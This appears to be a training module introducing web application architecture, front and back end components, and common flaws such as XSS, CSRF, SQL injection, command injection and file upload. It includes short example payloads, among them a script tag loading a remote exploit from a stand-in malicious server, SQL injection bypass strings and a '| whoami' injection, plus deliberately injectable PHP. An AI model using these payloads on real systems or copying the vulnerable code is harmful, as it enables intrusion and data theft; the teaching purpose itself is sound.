# Module 2: Introduction to Web Applications

## Introduction to Web Applications

### Introduction

Web applications run in browsers using a client–server model: the front end provides the user interface, and the back end runs on servers containing source code, logic, and databases. This design enables global accessibility, real-time updates, and no local installation. Examples include Gmail, Amazon, and Google Docs.

***

#### Web Applications vs. Websites

Traditional websites (**Web 1.0**) were static and identical for all users, requiring manual developer edits to change content.

Modern websites are powered by web applications (**Web 2.0**) that deliver dynamic, interactive, user-specific content.

Key differences:

* Static vs. dynamic content
* No interactivity vs. full functionality
* Manual updates vs. real-time updates
* Adaptation across devices and platforms

***

#### Web Applications vs. Native Applications

Web applications:

* Platform-independent, running in any browser
* Require no installation or local storage
* All users run the same version because updates occur centrally
* Lower maintenance and support costs

Native operating system (OS) applications:

* Faster due to integration with OS libraries
* More powerful because they leverage local hardware and resources

Hybrid and progressive web applications combine browser portability with native OS performance and features.

***

#### Web Application Distribution

* **Open source (customizable):** WordPress, OpenCart, Joomla
* **Closed source (licensed/subscription):** Wix, Shopify, DotNetNuke

***

#### Security Risks of Web Applications

Web applications expose large attack surfaces because they are globally accessible. Vulnerabilities may lead to breaches of sensitive databases and business disruption.

Mitigation requires:

* Frequent testing
* Prompt patching
* Secure coding practices throughout the lifecycle

Testing includes both front end components (HTML, CSS, JavaScript) and browser–server interactions in authenticated and unauthenticated states. The [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) is a standard reference.

***

#### Attacking Web Applications

Organizations rely on web applications for functions ranging from static sites to complex multi-role platforms. Their complexity introduces common flaws. A single flaw may enable data theft or **Remote Code Execution (RCE)**, especially when chained.

| Flaw                                        | Scenario                                                                                                                                                                                                                    |
| ------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **SQL Injection (SQLi)**                    | At **Portal.AcmeCorp.local**, a vulnerable login form does not sanitize input. Attackers extract Active Directory (AD) usernames and use them in a password spraying attack against a Virtual Private Network (VPN) portal. |
| **File Inclusion**                          | At **Support.AcmeCorp.local**, a file inclusion flaw allows an attacker to include and read the system file `/etc/passwd`.                                                                                                  |
| **Unrestricted File Upload**                | A profile picture upload on **Shop.AcmeCorp.local** accepts any file type. An attacker uploads a malicious PHP web shell and gains full control of the web server.                                                          |
| **Insecure Direct Object Reference (IDOR)** | Editing a profile at `/user/1001/edit-profile` and changing the ID to `/user/1002/edit-profile` grants access to another user’s account settings.                                                                           |
| **Broken Access Control**                   | At **Portal.AcmeCorp.local**, the signup POST request includes `username=user01&password=Welcome1&email=user01@AcmeCorp.local&roleid=3`. By changing `roleid=0`, an attacker registers as an administrator.                 |

***

### Web Application Layout

Web applications can be structured in different ways depending on infrastructure, components, and architecture.

***

#### Categories

| Category                           | Description                                                                                                                           |
| ---------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------- |
| **Web Application Infrastructure** | Structure of required components, such as databases and servers. Identifies where databases reside and which servers connect to them. |
| **Web Application Components**     | UI/UX, client, and server components the application interacts with.                                                                  |
| **Web Application Architecture**   | Relationships between the application’s components.                                                                                   |

***

#### Web Application Infrastructure

Common models:

* **Client–Server**: Server hosts the application; browser sends HTTP requests, server responds with processed results.
* **One Server**: All components, including databases, on one server. Simple but risky; single point of failure.
* **Many Servers – One Database**: Web servers access a shared database server. Provides segmentation but requires strong access controls.
* **Many Servers – Many Databases**: Each application uses its own database. Provides redundancy, segmentation, and security; often paired with load balancing.

Other models include serverless and microservices-based designs.

***

#### Web Application Components

Typical components:

* Client
* Server
* Web server
* Application logic
* Database
* Services (microservices)
* Third-party integrations
* Serverless functions

***

#### Web Application Architecture

Three-tier model:

| Layer                  | Description                                                               |
| ---------------------- | ------------------------------------------------------------------------- |
| **Presentation Layer** | UI returned to the client, built with HTML, CSS, JavaScript.              |
| **Application Layer**  | Processes client requests, handles authorization, and prepares responses. |
| **Data Layer**         | Stores and retrieves required data.                                       |

***

#### Microservices

* Independent components, each built for a single task (e.g., registration, search, payments, reviews).
* Stateless communication; data stored separately.
* Can be written in different languages but interoperate.
* Benefits: agility, scaling, reusability, resilience.

***

#### Serverless

* Cloud providers (AWS, GCP, Azure) host applications without manual server management.
* Applications run in stateless containers (e.g., Docker).
* Enables deployment without provisioning or maintaining infrastructure.

***

#### Architecture Security

* Vulnerabilities may stem from design flaws, not just coding errors.
* Example: lack of **Role-Based Access Control (RBAC)** may let users access admin features or other users’ data.
* Example: database hosted separately; compromising a web server may reveal only partial data.

Security must be integrated at all stages of development, with penetration testing throughout the lifecycle.

***

### Front End vs. Back End

Full stack development covers both front end and back end. Each has distinct functions.

***

#### Front End

Executed in the browser with HTML, CSS, and JavaScript. Responsible for all visible, interactive elements. Must adapt across devices and screen sizes.

Tasks include:

* Visual concept design
* User Interface (UI) design
* User Experience (UX) design

Example:

```html
<p><strong>Welcome to AcmeCorp Academy</strong></p>
<p><em>This is some italic text.</em></p>
<p><span style="color: #0000ff;">This is some blue text.</span></p>
```

***

#### Back End

Runs on servers, powering application functionality.

| Component            | Description                                                                   |
| -------------------- | ----------------------------------------------------------------------------- |
| **Back End Servers** | Host hardware and OS (Linux, Windows, containers).                            |
| **Web Servers**      | Handle HTTP requests (Apache, NGINX, IIS).                                    |
| **Databases**        | Relational: MySQL, MSSQL, Oracle, PostgreSQL. Non-relational: NoSQL, MongoDB. |
| **Frameworks**       | Application development: Laravel, ASP.NET, Spring, Django, Express.           |

Back end may be separated into dedicated servers or containers for segmentation.

Tasks include:

* Develop logic and services
* Implement APIs
* Maintain databases
* Integrate cloud and remote services

***

#### Securing Front and Back End

* Vulnerabilities include SQL Injection (SQLi) and Command Injection.
* **Whitebox testing**: front end code review.
* **Blackbox testing**: testing back end without code access.
* Open source or LFI exposure may provide back end source code.

***

#### Common Development Mistakes

| No. | Mistake                                 |
| --- | --------------------------------------- |
| 1   | Permitting invalid data into database   |
| 2   | Focusing only on system as a whole      |
| 3   | Using custom security methods           |
| 4   | Treating security as last step          |
| 5   | Storing plain text passwords            |
| 6   | Allowing weak passwords                 |
| 7   | Storing unencrypted data                |
| 8   | Over-reliance on client-side validation |
| 9   | Overconfidence in security              |
| 10  | Allowing variables in URL paths         |
| 11  | Trusting third-party code               |
| 12  | Hardcoding backdoor accounts            |
| 13  | Unverified SQL injection handling       |
| 14  | Allowing remote file inclusion          |
| 15  | Insecure data handling                  |
| 16  | Improper encryption                     |
| 17  | Using weak cryptography                 |
| 18  | Ignoring user behavior (layer 8)        |
| 19  | Failing to review user actions          |
| 20  | Misconfigured WAFs                      |

***

#### OWASP Top 10

| No. | Vulnerability                              |
| --- | ------------------------------------------ |
| 1   | Broken Access Control                      |
| 2   | Cryptographic Failures                     |
| 3   | Injection                                  |
| 4   | Insecure Design                            |
| 5   | Security Misconfiguration                  |
| 6   | Vulnerable and Outdated Components         |
| 7   | Identification and Authentication Failures |
| 8   | Software and Data Integrity Failures       |
| 9   | Security Logging and Monitoring Failures   |
| 10  | Server-Side Request Forgery (SSRF)         |

***

## Front End Components

### HTML

Defines structure of web pages with elements like titles, forms, and images.

Example page:

```html
<!DOCTYPE html>
<html>
  <head><title>Page Title</title></head>
  <body>
    <h1>A Heading</h1>
    <p>A Paragraph</p>
  </body>
</html>
```

Browser renders title _Page Title_, URL `www.example.local`, heading _A Heading_, paragraph _A Paragraph_.

***

#### Structure

Tree-like format:

```
document
 - html
   -- head
      --- title
   -- body
      --- h1
      --- p
```

Tags can contain IDs or classes for CSS/JS.

***

#### URL Encoding

Browsers use ASCII in URLs; non-ASCII must be encoded.

Examples:

* space = `%20` or `+`
* `'` = `%27`

| Character | Encoding |
| --------- | -------- |
| space     | %20      |
| !         | %21      |
| "         | %22      |
| #         | %23      |
| $         | %24      |
| %         | %25      |
| &         | %26      |
| '         | %27      |
| (         | %28      |
| )         | %29      |

***

#### DOM (Document Object Model)

Interface for accessing/updating content, structure, and style.

* Core DOM: all document types
* XML DOM: XML documents
* HTML DOM: HTML documents

Example references: `document.head`, `document.h1`.

Understanding DOM structure aids in reviewing source code and exploiting flaws such as **Cross-Site Scripting (XSS)**.

***

### Cascading Style Sheets (CSS)

Defines style and formatting of HTML elements.

Example:

```css
body {
  background-color: black;
}

h1 {
  color: white;
  text-align: center;
}

p {
  font-family: helvetica;
  font-size: 10px;
}
```

***

#### Syntax

Format: `element { property: value; }`

Properties include font, color, margin, padding, position, border, height, etc. CSS also supports animations (`@keyframes`, `animation-duration`, etc.).

***

#### Usage

* Style and formatting
* Real-time adjustments with JavaScript
* Animations and visual effects
* Styling XML, SVG, or mobile application UIs

***

#### Frameworks

Provide prebuilt styles and components. Common CSS frameworks:

* Bootstrap
* SASS
* Foundation
* Bulma
* Pure

***

### JavaScript

One of the most widely used programming languages, mainly for web and mobile development. Usually runs in the browser but can also run on the back end via NodeJS.

HTML and CSS define structure and style; JavaScript enables interactivity and functionality.

***

#### Example

Inline script:

```html
<script type="text/javascript">
..JavaScript code..
</script>
```

External script:

```html
<script src="./script.js"></script>
```

Basic function:

```javascript
document.getElementById("button1").innerHTML = "Changed Text!";
```

This updates the text of the element with ID `button1`.

***

#### Usage

* Update content in real time
* Process user input
* Perform asynchronous HTTP requests (Ajax)
* Automate workflows
* Power advanced animations beyond CSS
* Execute directly in browsers via built-in engines

***

#### Frameworks

Simplify development with reusable components and libraries.

Common front end JavaScript frameworks:

* Angular
* React
* Vue
* jQuery

***

## Front End Vulnerabilities

### Sensitive Data Exposure

***

All front end components run on the client side. Attacks against them do not directly threaten the back end but can endanger users. If exploited against admin users, these vulnerabilities may lead to unauthorized access, sensitive data leaks, or service disruption. While testing usually focuses on back end components, it is also important to test front end components, as they can provide access to sensitive functionality like admin panels.

Sensitive Data Exposure refers to sensitive data being available in clear-text to end users, often in the page source. This source is the HTML and JavaScript rendered on the client side, not the back end code stored on the server. Page source can be viewed through browser options (`View Page Source`, `Ctrl+U`) or tools like [Burp Suite](https://portswigger.net/burp). Disabling right-click does not prevent access. Page source often includes HTML, JavaScript, and external links, which may expose hidden information.

Exposed data may include:

* Login credentials or password hashes
* User information
* Hidden links or directories
* Debugging parameters or test pages

Such information can give attackers deeper access to the application or its supporting infrastructure.

***

#### Example

A login form may appear normal, but its source reveals sensitive information:

```html
<form action="login_action.php" method="post">
    <div class="container">
        <label for="uname"><b>Username</b></label>
        <input type="text" required>

        <label for="psw"><b>Password</b></label>
        <input type="password" required>

        <!-- TODO: remove test credentials user01:pass01 -->

        <button type="submit">Login</button>
    </div>
</form>
</html>

```

Developer comments show test credentials:

```html
<!-- TODO: remove test credentials user01:pass01 -->
```

Although rare, exposed credentials, hidden directories, or debugging code may appear in comments or external JavaScript. Automated tools can also scan source code for sensitive paths or data.

***

#### Prevention

* Keep only necessary code in the front end.
* Remove comments, hidden links, or debugging references before release.
* Classify data types and restrict exposure on the client side.
* Review client-side code to eliminate unnecessary information.
* Use JavaScript packing or obfuscation to hinder automated discovery of sensitive data.

***

### HTML Injection

***

Validating and sanitizing user input is a major aspect of front end security. Although input validation is often performed on the back end, some inputs are processed entirely on the front end. This makes it critical to validate and sanitize inputs on both sides.

HTML injection occurs when unfiltered user input is displayed on a page. This can happen when:

* Input is retrieved from a back end database and displayed without filtering.
* Input is directly displayed through JavaScript on the front end.

If the user controls how their input is displayed, they can inject HTML code that the browser will render. Examples include:

* Creating fake login forms to harvest credentials.
* Defacing web pages by altering layout, inserting ads, or changing content.

These attacks can result in reputational damage and user data compromise.

***

#### Example

A basic web page prompts for a name and displays it:

```html
<!DOCTYPE html>
<html>
<body>
    <button onclick="inputFunction()">Click to enter your name</button>
    <p id="output"></p>

    <script>
        function inputFunction() {
            var input = prompt("Please enter your name", "");
            if (input != null) {
                document.getElementById("output").innerHTML = "Your name is " + input;
            }
        }
    </script>
</body>
</html>
```

Because there is no sanitization, user input is rendered directly. Supplying HTML code as input can alter the page. For instance, entering:

```html
<style> body { background-image: url('https://AcmeCorp.local/images/banner.svg'); } </style>
```

changes the page background image.

In this case, the effect resets when the page is refreshed, but it demonstrates how easily HTML injection can be used to modify or exploit a web page.

***

### Cross-Site Scripting (XSS)

***

HTML Injection vulnerabilities can often be extended into Cross-Site Scripting (XSS) attacks by injecting JavaScript code that executes on the client side. Once an attacker executes code on a victim’s machine, they can potentially access the victim’s account or system.

XSS is similar to HTML Injection but focuses on JavaScript code for more advanced client-side attacks.

***

#### Types of XSS

| Type          | Description                                                                                                           |
| ------------- | --------------------------------------------------------------------------------------------------------------------- |
| Reflected XSS | User input is displayed immediately after processing (e.g., search results, error messages).                          |
| Stored XSS    | User input is saved in a back end database and later displayed (e.g., comments, posts).                               |
| DOM XSS       | User input is written directly to an HTML DOM object and displayed in the browser (e.g., username field, page title). |

***

#### Example

In the HTML Injection example, no input sanitization existed. The same page can be exploited for DOM XSS with this payload:

```javascript
#"><img src=/ onerror=alert(document.cookie)>
```

When submitted, the payload executes and displays the current user’s cookie value in an alert box.

This works because the browser processes the unsanitized input as part of the DOM and executes the injected JavaScript.

Attackers can use this to:

* Steal session cookies and hijack accounts
* Send stolen data to external servers
* Perform additional malicious actions against users

XSS is a broad attack category and will be examined in more detail in later modules.

***

### Cross-Site Request Forgery (CSRF)

***

Cross-Site Request Forgery (CSRF) is a front end vulnerability caused by unfiltered user input. CSRF can exploit XSS or HTTP parameters to perform unauthorized actions on a web application where the victim is already authenticated. This allows an attacker to perform actions as the victim without their knowledge.

A common CSRF attack is to change a victim’s password. A crafted JavaScript payload embedded in a vulnerable page (such as a malicious comment) executes automatically in the victim’s browser, using the victim’s session to change their password. The attacker can then log in using the new credentials.

Admins are especially valuable targets because they often have access to sensitive functions, including those that may affect the back end server.

Example payload to load a remote malicious script:

```html
"><script src=//MaliciousServer.net/exploit.js></script>
```

The file `exploit.js` would replicate the web application’s password-change procedure and automatically carry it out with the victim’s session.

***

#### Prevention

Mitigating CSRF requires both back end and front end defenses. Key measures include:

| Type         | Description                                                                              |
| ------------ | ---------------------------------------------------------------------------------------- |
| Sanitization | Remove special and non-standard characters from user input before storing or displaying. |
| Validation   | Ensure input matches the expected format (e.g., emails follow email format).             |

Additional protections:

* Sanitize displayed output to neutralize harmful characters.
* Deploy a Web Application Firewall (WAF) to help block injection attempts, though WAFs can be bypassed.
* Follow secure coding practices rather than relying solely on appliances.
* Rely on modern browser defenses, which block automatic JavaScript execution.
* Use anti-CSRF mechanisms such as unique per-request/session tokens.
* Apply HTTP-level protections like the `SameSite` cookie attribute (`Strict` or `Lax`) to restrict cookie inclusion in cross-origin requests.
* Require functional protections, such as re-entering the password before account changes.

Despite these measures, XSS and CSRF remain significant risks. Defensive controls should be layered, but applications must also be designed to be secure at their core.

For more detailed guidance, refer to the [**Cross-Site Request Forgery Prevention Cheat Sheet**](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) from OWASP.

***

## Back End Components

### Back End Servers

***

A back end server is the hardware and operating system that hosts the applications necessary to run a web application. It executes processes and tasks that make up the application and fits within the data access layer.

***

#### Software

The back end server contains three core back end components:

* **Web server**
* **Database**
* **Development framework**

It may also run hypervisors, containers, and Web Application Firewalls (WAFs).

Common solution stacks include:

| Combination | Components                              |
| ----------- | --------------------------------------- |
| LAMP        | Linux, Apache, MySQL, PHP               |
| WAMP        | Windows, Apache, MySQL, PHP             |
| WINS        | Windows, IIS, .NET, SQL Server          |
| MAMP        | macOS, Apache, MySQL, PHP               |
| XAMPP       | Cross-Platform, Apache, MySQL, PHP/PERL |

***

#### Hardware

The back end server also provides the hardware resources that determine application performance and stability. For large-scale web applications, multiple servers often work together to share load.

Instead of running on a single physical server, many applications use data centers or cloud hosting services that provide virtual hosts to deliver the application to end users.

***

### Web Servers

***

A web server is an application running on the back end server that handles HTTP traffic from client browsers, routes it to requested pages, and returns responses. Web servers typically run on TCP ports 80 (HTTP) and 443 (HTTPS). They connect end users to web application components and process their requests and responses.

***

#### Workflow

A web server processes HTTP requests and responds with codes such as:

| Code                          | Description                              |
| ----------------------------- | ---------------------------------------- |
| **200 OK**                    | Request succeeded                        |
| **301 Moved Permanently**     | Resource URL changed permanently         |
| **302 Found**                 | Resource URL changed temporarily         |
| **400 Bad Request**           | Invalid syntax in the request            |
| **401 Unauthorized**          | Unauthenticated access attempt           |
| **403 Forbidden**             | Access denied                            |
| **404 Not Found**             | Resource not found                       |
| **405 Method Not Allowed**    | Request method not permitted             |
| **408 Request Timeout**       | Request timed out                        |
| **500 Internal Server Error** | Generic server error                     |
| **502 Bad Gateway**           | Invalid response from an upstream server |
| **504 Gateway Timeout**       | Upstream server did not respond in time  |

Web servers accept inputs in various formats, including text, JSON, and binary (e.g., file uploads). They then route requests to the application’s core files and return the output to users.

**Example with cURL**

Retrieve response headers:

```bash
user01@AcmeCorp:~$ curl -I https://training.AcmeCorp.local
HTTP/2 200
date: Tue, 15 Dec 2020 19:54:29 GMT
content-type: text/html; charset=UTF-8
...SNIP...
```

Retrieve page source:

```bash
user01@AcmeCorp:~$ curl https://training.AcmeCorp.local
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<title>Cyber Security Training : AcmeCorp Academy</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
```

***

#### Apache

Apache (`httpd`) is the most widely used web server, hosting over 40% of websites. It is pre-installed on many Linux distributions and also available on Windows and macOS.

* Commonly paired with PHP but supports .NET, Python, Perl, and Bash through CGI.
* Extended by modules (e.g., `mod_php` for PHP support).
* Open-source, regularly patched, and well documented.
* Popular among startups and smaller organizations, though also used by large enterprises such as Apple, Adobe, and Baidu.

***

#### NGINX

NGINX is the second most widely used web server, hosting \~30% of websites.

* Uses asynchronous architecture for handling large volumes of requests efficiently.
* Favored by high-traffic sites (around 60% of the top 100,000 websites).
* Free, open-source, secure, and reliable.
* Used by companies such as Google, Facebook, Twitter, Cisco, Intel, and Netflix.

***

#### IIS

Internet Information Services (IIS) is Microsoft’s web server, hosting \~15% of websites.

* Runs on Windows Server, optimized for .NET applications but also supports PHP and FTP.
* Integrates with Active Directory, supporting Windows Authentication.
* Used by organizations that rely on Windows infrastructure.
* Examples include Microsoft, Office365, Skype, Stack Overflow, and Dell.

***

#### Other Servers

Additional web servers include:

* **Apache Tomcat** for Java applications.
* **Node.js** for JavaScript-based back end applications.

***

### Databases

***

Web applications rely on back end databases to store assets, content, and user data. Databases allow efficient storage and retrieval of information, enabling dynamic and personalized content. Developers evaluate databases based on speed, scalability, size, and cost.

***

#### Relational (SQL)

Relational databases organize data into tables, rows, and columns. Keys create relationships between tables, forming a schema.

Example schema:

* **users table**: id, username, first\_name, last\_name
* **posts table**: id, user\_id, date, content

The `user_id` in the posts table links back to the `id` in the users table, allowing retrieval of user details for each post without duplication.

**Example Tables with Data**

**users table**

| id | username | first\_name | last\_name |
| -- | -------- | ----------- | ---------- |
| 1  | user01   | Alice       | Morgan     |
| 2  | user02   | Brian       | Carter     |
| 3  | user03   | Chloe       | Dawson     |

**posts table**

| id  | user\_id | date       | content                          |
| --- | -------- | ---------- | -------------------------------- |
| 101 | 1        | 2021-01-01 | Happy New Year from AcmeCorp!    |
| 102 | 2        | 2021-01-02 | Excited to join this platform.   |
| 103 | 1        | 2021-01-03 | Just uploaded new project files. |
| 104 | 3        | 2021-01-04 | Looking forward to connecting.   |

With this structure, querying posts can easily pull in user details through the relationship between `users.id` and `posts.user_id`.

Common relational databases:

| Type       | Description                                                |
| ---------- | ---------------------------------------------------------- |
| MySQL      | Most common open-source database, free to use              |
| MSSQL      | Microsoft’s SQL database, widely used with Windows and IIS |
| Oracle     | Reliable and feature-rich, often costly                    |
| PostgreSQL | Free, open-source, extensible                              |

Other options include SQLite, MariaDB, Amazon Aurora, and Azure SQL.

***

#### Non-relational (NoSQL)

NoSQL databases do not use tables, rows, columns, or schemas. They support flexible, scalable data models for poorly structured datasets.

Common storage models:

* **Key-Value**
* **Document-Based**
* **Wide-Column**
* **Graph**

Example of a Key-Value model in JSON:

```json
{
  "100001": {
    "date": "01-01-2021",
    "content": "Welcome to this web application."
  },
  "100002": {
    "date": "02-01-2021",
    "content": "This is the first post on this web app."
  },
  "100003": {
    "date": "02-01-2021",
    "content": "Reminder: Tomorrow is the ..."
  }
}
```

Common NoSQL databases:

| Type             | Description                                         |
| ---------------- | --------------------------------------------------- |
| MongoDB          | Document-based, JSON storage, free and open-source  |
| ElasticSearch    | Optimized for search and analysis of large datasets |
| Apache Cassandra | Highly scalable, fault-tolerant                     |
| Others           | Redis, Neo4j, CouchDB, Amazon DynamoDB              |

***

#### Use in Web Applications

Databases must be installed and configured on the back end server before integration. Development frameworks provide functions to store and retrieve data easily.

Example in PHP with MySQL:

```php
$conn = new mysqli("localhost", "user01", "pass01");
$sql = "CREATE DATABASE database1";
$conn->query($sql);

$conn = new mysqli("localhost", "user01", "pass01", "database1");
$query = "select * from table_1";
$result = $conn->query($query);
```

Handling user search input:

```php
$searchInput = $_POST['findUser'];
$query = "select * from users where name like '%$searchInput%'";
$result = $conn->query($query);

while($row = $result->fetch_assoc()){
    echo $row["name"]."<br>";
}
```

Databases simplify dynamic content but require secure coding practices. Poor handling of user input can lead to vulnerabilities such as SQL Injection.

***

### Development Frameworks & APIs

***

Modern web applications are often developed with frameworks that provide common functionality and APIs that enable communication between front end and back end components. These tools make development faster, more reliable, and scalable.

***

#### Development Frameworks

Frameworks simplify development by providing prebuilt features such as user registration, authentication, and routing. They reduce the need to build core functionality from scratch and integrate easily with front end components.

Common frameworks:

* **Laravel (PHP):** Popular with startups; powerful yet easy to develop.
* **Express (Node.js):** Used by PayPal, Yahoo, Uber, IBM, and MySpace.
* **Django (Python):** Used by Google, YouTube, Instagram, Mozilla, and Pinterest.
* **Rails (Ruby):** Used by GitHub, Hulu, Twitch, Airbnb, and previously Twitter.

Popular websites often combine multiple frameworks and web servers.

***

#### APIs

Application Programming Interfaces (APIs) connect the front end and back end, allowing data exchange and enabling functionality. APIs process requests from the front end, perform back end operations, and return responses for the browser to render.

***

#### Query Parameters

Front end components can pass arguments to the back end using GET or POST requests.

Example:

* GET request: `/search.php?item=apples`
* POST request:

```http
POST /search.php HTTP/1.1
...SNIP...

item=apples
```

Query parameters allow a single page to handle different inputs. For more efficiency, web APIs are often used.

***

#### Web APIs

APIs define how applications interact with each other. For web applications, APIs are typically accessed over HTTP and may return data in formats like JSON or XML.

Examples:

* A weather API returning JSON with current conditions.
* Twitter’s API providing access to tweets and posting capabilities (with authentication).

APIs are usually implemented with standards such as SOAP or REST.

***

#### SOAP

Simple Object Access Protocol (SOAP) exchanges structured data through XML. Both requests and responses are XML.

Example SOAP message:

```xml
<?xml version="1.0"?>
<soap:Envelope
 xmlns:soap="http://AcmeCorp.local/soap/soap/"
 soap:encodingStyle="http://www.w3.org/soap/soap-encoding">

 <soap:Header>
 </soap:Header>

 <soap:Body>
   <soap:Fault>
   </soap:Fault>
 </soap:Body>

</soap:Envelope>
```

* Useful for transferring structured data, binary data, or serialized objects.
* Supports stateful objects and complex transactions.
* Can be difficult for beginners, requiring verbose requests.

***

#### REST

Representational State Transfer (REST) uses URL paths and usually returns JSON responses.

Example: `GET /category/posts/`

```json
{
  "100001": {
    "date": "01-01-2021",
    "content": "Welcome to this web application."
  },
  "100002": {
    "date": "02-01-2021",
    "content": "This is the first post on this web app."
  },
  "100003": {
    "date": "02-01-2021",
    "content": "Reminder: Tomorrow is the ..."
  }
}
```

REST focuses on modular, scalable design by breaking functionality into smaller APIs.

HTTP methods used in REST:

* **GET:** Retrieve data
* **POST:** Create data (non-idempotent)
* **PUT:** Create or replace data (idempotent)
* **DELETE:** Remove data

***

## Back End Vulnerabilities

### Common Web Vulnerabilities

***

During penetration testing, vulnerabilities may be discovered in custom-built web applications or in publicly available ones due to developer misconfigurations. Many of these map directly to the [OWASP Top 10](https://owasp.org/Top10/) list of web application risks.

***

#### Broken Authentication/Access Control

* **Broken Authentication:** Allows attackers to bypass login functions, such as authenticating without valid credentials or escalating from a normal user to administrator.
* **Broken Access Control:** Grants attackers access to restricted areas, such as an admin panel, without proper authorization.

**Example:**\
In a vulnerable College Management System, the following input in the email field allows login without an account:

```
' or 0=0 #
```

Any password can be used. This bypasses authentication and grants access.

***

#### Malicious File Upload

Improperly validated file upload features may allow attackers to upload malicious scripts (e.g., PHP shells). Once uploaded, these scripts can execute arbitrary commands on the server.

Even if developers implement checks, weak validation (such as file extension checks) can be bypassed.

**Example:**\
A vulnerable WordPress plugin allows arbitrary file upload by accepting files with double extensions, such as:

```
shell.php.jpg
```

This enables remote code execution. Tools such as Metasploit can automate exploitation of such flaws.

***

#### Command Injection

When web applications pass user input directly into operating system commands without sanitization, attackers can inject additional commands.

**Example:**\
A vulnerable plugin executes OS commands using user-supplied input. Supplying an extra command, such as:

```
192.168.1.1 | whoami
```

causes the application to execute both the intended command and the injected one, giving attackers direct access to the back end server.

***

#### SQL Injection (SQLi)

SQL Injection occurs when user input is unsafely concatenated into SQL queries. Attackers can manipulate queries to bypass authentication, retrieve data, or even control the database server.

**Example vulnerable code:**

```php
$query = "select * from users where name like '%$searchInput%'";
```

If `$searchInput` is not sanitized, an attacker could input:

```
' OR '1'='1
```

This always evaluates to true, bypassing authentication. SQLi can also be used to extract database contents or escalate privileges.

***

### Public Vulnerabilities

***

The most critical back end component vulnerabilities are those exploitable externally, allowing attackers to compromise the back end server without local access. These vulnerabilities often stem from coding mistakes during development and range from simple issues to highly complex flaws requiring deep knowledge of the application.

***

#### Public CVE

Publicly deployed applications, especially open-source or widely used proprietary platforms, are frequently analyzed by security researchers. Discovered vulnerabilities are assigned a CVE (Common Vulnerabilities and Exposures) record with a severity score.

Penetration testers often create proof-of-concept exploits for testing and educational purposes, making **searching for public exploits the first step** when assessing a web application.

**Process:**

1. Identify the web application version (e.g., in `version.php` or source code).
2. Confirm the version on the target system.
3. Search for known exploits in databases such as:
   * [Exploit Database (Exploit DB)](https://www.exploit-db.com/)
   * [Rapid7 Vulnerability & Exploit Database](https://www.rapid7.com/db/)
   * [Vulnerability Lab](https://www.vulnerability-lab.com/)

Exploits with a **CVSS score of 8–10** or those enabling **Remote Code Execution (RCE)** are the most critical. If unavailable, other exploit types should still be considered.

Vulnerabilities may also exist in supporting components, such as plugins or modules, so these should be investigated as well.

***

#### Common Vulnerability Scoring System (CVSS)

The [CVSS](https://www.first.org/cvss/) standard measures the severity of vulnerabilities, producing scores between 0 and 10. Scores are based on:

* **Base metrics** – inherent characteristics of the vulnerability.
* **Temporal metrics** – factors that may change over time.
* **Environmental metrics** – organization-specific impact.

The [National Vulnerability Database (NVD)](https://nvd.nist.gov/) provides CVSS scores, typically base scores only.

**CVSS v2 Ratings:**

| Severity | Base Score Range |
| -------- | ---------------- |
| Low      | 0.0–3.9          |
| Medium   | 4.0–6.9          |
| High     | 7.0–10.0         |

**CVSS v3 Ratings:**

| Severity | Base Score Range |
| -------- | ---------------- |
| None     | 0.0              |
| Low      | 0.1–3.9          |
| Medium   | 4.0–6.9          |
| High     | 7.0–8.9          |
| Critical | 9.0–10.0         |

NVD provides calculators for v2 and v3, allowing organizations to apply Temporal and Environmental factors. These tools help tailor severity ratings to specific environments.

***

#### Back End Server Vulnerabilities

Beyond web applications themselves, vulnerabilities also affect supporting back end components:

* **Web servers:** Publicly accessible and high-value targets.
  * Example: _Shellshock_ (2014) in Apache servers, exploited via HTTP requests to gain remote code execution.
* **Back end servers and databases:** Usually exploited after local access is gained through external flaws or internal penetration testing.
  * Used for privilege escalation or lateral movement within the network.

While not always externally exploitable, patching these vulnerabilities is critical to prevent full compromise of the application and infrastructure.

***
